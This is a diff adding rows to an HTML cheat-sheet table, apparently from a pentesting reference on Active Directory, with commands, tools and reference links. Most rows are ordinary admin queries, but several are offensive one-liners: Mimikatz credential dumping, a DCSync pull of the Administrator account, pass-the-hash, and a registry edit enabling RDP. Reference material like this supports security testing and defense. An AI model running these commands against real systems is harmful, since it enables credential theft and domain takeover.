@@ -847,6 +847,72 @@
 	            <td>Mimikatz</td>
 	            <td><a href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mimikatz-cheatsheet/#pass-the-ticket" target="_blank">Mimikatz Cheat Sheet - Pass-the-Ticket</a></td>
 	        </tr>
+		<tr>
+	            <td>Dump Cached Domain Credentials</td>
+	            <td><code>mimikatz # sekurlsa::logonpasswords</code> (Requires elevated privileges)</td>
+	            <td>Mimikatz</td>
+	            <td><a href="https://hadess.io/mimikatz-comprehensive-guide/" target="_blank">Comprehensive Mimikatz Guide</a></td>
+	        </tr>
+	        <tr>
+	            <td>Dump Domain Credentials using DCSync</td>
+	            <td><code>lsadump::dcsync /domain:domain.local /user:Administrator</code></td>
+	            <td>Mimikatz</td>
+	            <td><a href="https://adsecurity.org/?p=1729" target="_blank">ADSecurity - DCSync Attack</a></td>
+	        </tr>
+	        <tr>
+	            <td>Enable Remote Desktop (RDP)</td>
+	            <td><code>reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></td>
+	            <td>CMD</td>
+	            <td><a href="https://book.hacktricks.xyz/windows-hardening/enable-rdp-windows" target="_blank">HackTricks - Enable RDP</a></td>
+	        </tr>
+	        <tr>
+	            <td>Check Registry Keys for Persistence</td>
+	            <td><code>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></td>
+	            <td>CMD</td>
+	            <td><a href="https://ss64.com/nt/" target="_blank">SS64 - Reg Command</a></td>
+	        </tr>
+	        <tr>
+	            <td>List User Rights Assignments</td>
+	            <td><code>Get-GPResultantSetOfPolicy -User domain\username -ReportType Html -Path C:\gporeport.html</code></td>
+	            <td>PowerShell</td>
+	            <td><a href="https://learn.microsoft.com/en-us/powershell/module/grouppolicy/get-gpresulstantsetofpolicy" target="_blank">Microsoft Documentation</a></td>
+	        </tr>
+	        <tr>
+	            <td>Export All Group Policy Objects</td>
+	            <td><code>Backup-GPO -All -Path "C:\GPOBackups"</code></td>
+	            <td>PowerShell</td>
+	            <td><a href="https://learn.microsoft.com/en-us/powershell/module/grouppolicy/backup-gpo" target="_blank">Microsoft Documentation</a></td>
+	        </tr>
+	        <tr>
+	            <td>Pass-the-Hash Attack on Local Account</td>
+	            <td><code>sekurlsa::pth /user:LocalUser /domain:localhost /ntlm:<ntlm_hash> /run:powershell.exe</code></td>
+	            <td>Mimikatz</td>
+	            <td><a href="https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz" target="_blank">HackTricks - Pass-the-Hash</a></td>
+	        </tr>
+	        <tr>
+	            <td>List all Open Network Connections</td>
+	            <td><code>netstat -ano</code></td>
+	            <td>CMD</td>
+	            <td><a href="https://ss64.com/nt/" target="_blank">SS64 - Netstat Command</a></td>
+	        </tr>
+	        <tr>
+	            <td>Query Active Directory Replication Partners</td>
+	            <td><code>repadmin /showrepl</code></td>
+	            <td>CMD</td>
+	            <td><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/repadmin" target="_blank">Microsoft Documentation</a></td>
+	        </tr>
+	        <tr>
+	            <td>List All Active Directory Sites</td>
+	            <td><code>Get-ADReplicationSite -Filter *</code></td>
+	            <td>PowerShell</td>
+	            <td><a href="https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adreplicationsite" target="_blank">Microsoft Documentation</a></td>
+	        </tr>
+	        <tr>
+	            <td>Identify Domain Admins Group Members</td>
+	            <td><code>Get-ADGroupMember -Identity "Domain Admins"</code></td>
+	            <td>PowerShell</td>
+	            <td><a href="https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember" target="_blank">Microsoft Documentation</a></td>
+	        </tr>
 		<!-- Submit your PR -->
     </tbody>
 </table>
